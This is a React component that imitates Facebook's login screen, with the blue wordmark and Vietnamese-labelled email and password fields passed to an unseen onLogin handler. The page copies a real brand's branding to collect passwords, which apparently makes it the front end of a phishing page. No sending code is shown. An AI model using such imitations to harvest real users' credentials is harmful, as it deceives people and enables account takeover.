import React from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader } from 'lucide-react';

const FacebookLoginClone = ({ onLogin, isLoading }) => (
    <div className="bg-white p-4 rounded-lg text-black w-full flex flex-col justify-center">
        <div className="p-4 bg-white border-none w-full">
            <form onSubmit={onLogin} className="space-y-3">
                <div className="text-center mb-4">
                    <h1 className="text-5xl font-bold text-blue-600">facebook</h1>
                </div>
                <div>
                    <Input
                        id="account" name="account" type="text" placeholder="Email hoặc số điện thoại" required
                        className="h-12 text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black"
                        disabled={isLoading}
                    />
                </div>
                <div>
                    <Input
                        id="password" name="password" type="password" placeholder="Mật khẩu" required
                        className="h-12 text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black"
                        disabled={isLoading}
                    />
                </div>
                <Button type="submit" className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-lg font-bold" disabled={isLoading}>
                    {isLoading ? <Loader className="mr-2 h-5 w-5 animate-spin" /> : 'Đăng nhập'}
                </Button>
            </form>
            <div className="text-center mt-3">
                <button className="text-sm text-blue-600 hover:underline">Quên mật khẩu?</button>
            </div>
        </div>
    </div>
);

export default FacebookLoginClone;